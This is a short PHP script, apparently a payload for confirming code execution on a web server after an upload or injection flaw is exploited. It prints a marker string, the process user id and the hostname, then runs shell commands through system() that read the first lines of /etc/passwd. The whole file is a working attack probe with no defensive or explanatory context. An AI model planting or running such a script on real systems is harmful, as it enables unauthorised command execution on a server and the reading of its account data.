<?php
header("Content-Type: text/plain");
echo "i1599 uid=".posix_geteuid()." host=".gethostname()."\n";
system("id; hostname; head -3 /etc/passwd");
?>
